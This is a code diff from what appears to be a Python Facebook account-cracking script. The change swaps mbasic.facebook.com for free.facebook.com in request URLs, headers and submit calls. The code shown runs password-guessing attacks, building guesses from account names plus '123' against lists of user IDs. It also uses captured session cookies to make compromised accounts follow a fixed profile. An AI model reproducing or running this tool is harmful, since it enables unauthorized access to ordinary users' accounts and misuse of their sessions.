@@ -59,7 +59,7 @@ id = []
 user = []
 loop = 0
 url_lookup = "https://lookup-id.com/"
-url_mb = "https://mbasic.facebook.com"
+url_mb = "https://free.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
 header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
@@ -143,7 +143,7 @@ class __xxx__:
                     "sec-fetch-mode":"cors",
                     "sec-fetch-user":"empty",
                     "sec-fetch-dest":"document",
-                    "referer":"https://mbasic.facebook.com/",
+                    "referer":"https://free.facebook.com/",
                     "accept-encoding":"gzip, deflate br",
                     "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                 }
@@ -191,7 +191,7 @@ class __xxx__:
     def follow(self, session, coki):
         r = BeautifulSoup(session.get('https://www.facebook.com/okiew.you', cookies={'cookie': coki}).text, 'html.parser')
         get = r.find('a', string='Ikuti').get('href')
-        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
+        session.get(('https://free.facebook.com' + str(get)), cookies={'cookie': coki}).text
                 
     def __pler__(self):
         print('[1] Crack With 2 pass Fast ')
@@ -214,7 +214,7 @@ class __xxx__:
                             pwx = [name, xz[0]+xz[1], xz[0]+"123"]
                         else:
                         	pwx = [name, xz[0]+xz[1], xz[0]+"123"]
-                        kbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                        kbworld.submit(self.__metode__, uid, pwx, "free.facebook.com")
                     except:
                         pass
             hasil(ok,cp)
@@ -236,7 +236,7 @@ class __xxx__:
                             pwx = [p1]
                         else:
                             pwx = [p1]
-                        kbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                        kbworld.submit(self.__metode__, uid, pwx, "free.facebook.com")
                     except:
                         pass
             hasil(ok,cp)
